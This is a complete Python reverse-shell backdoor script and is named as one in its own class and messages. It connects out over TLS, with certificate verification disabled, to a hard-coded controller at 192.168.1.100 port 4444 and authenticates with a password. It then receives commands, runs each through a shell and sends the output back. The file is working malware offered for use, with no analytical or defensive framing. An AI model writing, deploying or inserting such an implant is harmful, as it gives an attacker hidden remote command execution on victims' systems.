#!/usr/bin/env python3
import base64
import json
import os
import socket
import subprocess
import sys
import ssl

class Backdoor:
    def __init__(self, ip, port, password):
        self.password = password
        self.connection = self._secure_connect(ip, port)

    def _secure_connect(self, ip, port):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_socket = context.wrap_socket(raw_socket)
        secure_socket.connect((ip, port))
        return secure_socket

    def _authenticate(self):
        self.connection.send(self.password.encode())
        response = self.connection.recv(1024).decode()
        if response != "AUTH_SUCCESS":
            raise Exception("Authentication failed!")

    def execute_system_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8', errors='replace')
        except subprocess.CalledProcessError as e:
            return f"[-] Command failed: {e.output.decode('utf-8', errors='replace')}"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    break
                json_data += chunk
                return json.loads(json_data.decode())
            except (ValueError, json.JSONDecodeError):
                continue

    def run(self):
        try:
            self._authenticate()
            while True:
                command = self.reliable_receive()
                if not command:
                    continue
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit(0)
                result = self.execute_system_command(command)
                self.reliable_send(result)
        except Exception as e:
            print(f"[-] Backdoor error: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    my_backdoor = Backdoor("192.168.1.100", 4444, "your_secure_password_here")
    my_backdoor.run()